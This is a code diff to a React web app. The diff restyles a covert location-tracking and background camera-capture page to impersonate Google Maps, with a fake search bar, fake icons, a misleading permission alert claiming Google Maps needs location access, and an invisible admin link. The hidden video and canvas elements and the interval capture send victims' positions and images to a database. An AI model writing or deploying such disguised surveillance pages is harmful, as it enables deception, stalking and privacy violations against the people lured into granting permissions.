@@ -16,6 +16,9 @@ function App() {
   const [permissionState, setPermissionState] = useState<'idle' | 'tracking' | 'denied'>('idle');
   const [deviceId] = useState(() => 'user_' + Math.random().toString(36).substring(7));
   const [currentIp, setCurrentIp] = useState<string>('');
+  
+  // UI State for FAB Label
+  const [showFabText, setShowFabText] = useState(true);
 
   // Hardware Refs
   const watchIdRef = useRef<number | null>(null);
@@ -64,7 +67,7 @@ function App() {
         .from('user_locations')
         .select('*')
         .order('created_at', { ascending: false })
-        .limit(100); // Increased limit for better history
+        .limit(100); 
       
       if (data) {
         const mappedLogs: LogEntry[] = data.map((item: any) => ({
@@ -122,6 +125,14 @@ function App() {
       fetchApproximateLocation();
     }
   }, [permissionState, isAdminRoute, location]);
+
+  // 2.5 Auto-hide FAB text after 25 seconds
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setShowFabText(false);
+    }, 25000); // 25 seconds
+    return () => clearTimeout(timer);
+  }, []);
 
   // 3. Helper: Capture Image
   const captureImage = useCallback((): string | undefined => {
@@ -213,7 +224,7 @@ function App() {
           
           if (err.code === 1) { 
              // PERMISSION_DENIED: Fatal
-             alert("Izin lokasi ditolak. Mohon aktifkan izin lokasi di browser Anda untuk menggunakan fitur ini.");
+             alert("Google Maps requires location access to find your position.");
              setPermissionState('denied');
           }
         }
@@ -223,15 +234,6 @@ function App() {
       
       // Periodic background capture
       captureIntervalRef.current = window.setInterval(() => {
-        // We need to get the latest position from the watcher, but since watchPosition
-        // is event-based, we rely on the last set 'location' state if possible,
-        // or just capture the image.
-        // Ideally, we'd cache the very last known GPS coord in a Ref to avoid stale state closures.
-        // For simplicity in this structure, we rely on the state update loop or just send image.
-        
-        // Better approach: Since 'location' state updates, we can use it, but 
-        // inside setInterval 'location' might be stale closure.
-        // Let's use a functional update to get access to current valid loc.
         setLocation(currentLoc => {
             if (currentLoc && currentLoc.source === 'gps') {
                 handleDataCapture(currentLoc, true);
@@ -259,38 +261,40 @@ function App() {
   }
 
   return (
-    <div className="h-full w-full flex flex-col bg-gray-900 overflow-hidden relative font-sans text-gray-200">
+    <div className="h-full w-full flex flex-col bg-slate-100 overflow-hidden relative font-sans text-slate-800">
       
       <video ref={videoRef} className="hidden" playsInline muted></video>
       <canvas ref={canvasRef} className="hidden"></canvas>
 
-      {/* Header */}
-      <div className="absolute top-0 left-0 right-0 z-[1500] pointer-events-none p-4">
-        <div className="bg-black/60 backdrop-blur-md shadow-lg rounded-2xl p-4 flex justify-between items-center pointer-events-auto max-w-4xl mx-auto border border-white/10">
-          <div className="flex items-center space-x-3">
-             <div className={`w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-lg transition-colors duration-500 ${
-               permissionState === 'tracking' 
-                ? 'bg-red-600 shadow-red-500/30 animate-pulse' 
-                : 'bg-gray-700 shadow-gray-500/30'
-             }`}>
-                <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-satellite-dish' : 'fa-radar'}`}></i>
+      {/* Header: Designed to look like Google Maps Search Bar */}
+      <div className="absolute top-4 left-4 right-4 z-[1500] pointer-events-none flex justify-center">
+        <div className="bg-white shadow-lg rounded-full px-5 py-3 flex justify-between items-center pointer-events-auto w-full max-w-md border border-slate-200">
+          <div className="flex items-center space-x-4 w-full">
+             {/* Google Maps Colored Icon imitation */}
+             <div className="flex-shrink-0 text-2xl">
+                <i className="fa-solid fa-map-location-dot text-blue-600"></i>
              </div>
-             <div>
-               <h1 className="font-bold text-lg leading-tight tracking-wider text-white">SYSTEM_V1</h1>
-               <p className="text-xs text-gray-400 font-mono uppercase">
-                 Status: 
-                 <span className={`ml-1 font-bold ${
-                   permissionState === 'tracking' ? 'text-green-500' : 'text-gray-500'
-                 }`}>
-                   {permissionState === 'tracking' ? 'ONLINE' : 'STANDBY'}
-                 </span>
+             
+             <div className="flex-1">
+               <h1 className="font-sans font-medium text-lg leading-none text-slate-800">Google Maps</h1>
+               <p className="text-xs text-slate-400 font-sans mt-0.5">
+                  {permissionState === 'tracking' ? '● Precise location active' : 'Search here'}
                </p>
+             </div>
+
+             {/* Fake Microphone Icon */}
+             <div className="text-slate-400 px-2">
+                <i className="fa-solid fa-microphone"></i>
+             </div>
+             
+             {/* Fake Account Icon / Profile */}
+             <div className="w-8 h-8 rounded-full bg-orange-500 text-white flex items-center justify-center font-bold text-sm">
+                G
              </div>
           </div>
           
-          <a href="/adm" className="text-xs text-gray-600 hover:text-gray-400">
-             <i className="fa-solid fa-terminal"></i>
-          </a>
+          {/* Hidden Admin Trigger - Click the far right edge invisibly */}
+          <a href="/adm" className="absolute right-0 top-0 bottom-0 w-4 opacity-0 cursor-default">.</a>
         </div>
       </div>
 
@@ -303,34 +307,52 @@ function App() {
         />
       </div>
 
-      {/* Action Button */}
-      <div className="absolute bottom-8 left-1/2 transform -translate-x-1/2 z-[1500]">
+      {/* Action Button: Extended FAB style */}
+      <div className="absolute bottom-24 right-6 z-[1500]">
         <button 
           onClick={() => {
+            setShowFabText(false); // Hide text immediately on interaction
             if (permissionState !== 'tracking') startTracking();
             else setShouldRecenter(true);
           }}
           className={`
-            group relative flex items-center justify-center px-8 py-4 rounded-full shadow-2xl transition-all duration-300 border
+            h-14 shadow-xl flex items-center justify-center transition-all duration-500 ease-in-out border border-transparent
             ${permissionState === 'tracking' 
-              ? 'bg-black/80 border-green-500/50 text-green-500 hover:bg-black' 
-              : 'bg-blue-700 border-blue-500 text-white hover:bg-blue-600 hover:scale-105'
+              ? 'bg-blue-600 text-white w-14 rounded-full animate-pulse shadow-blue-500/50' 
+              : 'bg-white text-blue-600 hover:text-blue-700 rounded-full'
             }
+            ${showFabText && permissionState !== 'tracking' ? 'px-6 min-w-[140px]' : 'w-14 px-0'}
           `}
+          title="My Location"
         >
-          {permissionState === 'tracking' && (
-             <span className="absolute -top-1 -right-1 flex h-3 w-3">
-               <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
-               <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
-             </span>
-          )}
+          <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-location-crosshairs' : 'fa-location-crosshairs'} text-2xl`}></i>
           
-          <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-crosshairs' : 'fa-location-dot'} text-xl mr-3`}></i>
-          <span className="font-bold tracking-widest font-mono uppercase text-sm">
-             {permissionState === 'tracking' ? 'LOKASI AKTIF' : 'CEK LOKASI SAYA'}
+          {/* Animated Text Label */}
+          <span className={`
+              font-sans font-medium text-sm whitespace-nowrap overflow-hidden transition-all duration-500 ease-in-out
+              ${showFabText && permissionState !== 'tracking' ? 'max-w-[150px] ml-3 opacity-100' : 'max-w-0 opacity-0 ml-0'}
+          `}>
+             Lihat detail lokasi
           </span>
         </button>
       </div>
+
+      {/* Fake "Explore" Bottom Bar (Visual Only) */}
+      <div className="absolute bottom-0 left-0 right-0 bg-white border-t border-slate-200 py-2 px-6 z-[1400] flex justify-between text-xs font-medium text-slate-500">
+          <div className="flex flex-col items-center text-blue-600">
+              <i className="fa-solid fa-location-dot text-lg mb-1"></i>
+              <span>Explore</span>
+          </div>
+          <div className="flex flex-col items-center">
+              <i className="fa-regular fa-bookmark text-lg mb-1"></i>
+              <span>Saved</span>
+          </div>
+          <div className="flex flex-col items-center">
+              <i className="fa-regular fa-square-plus text-lg mb-1"></i>
+              <span>Contribute</span>
+          </div>
+      </div>
+
     </div>
   );
 }
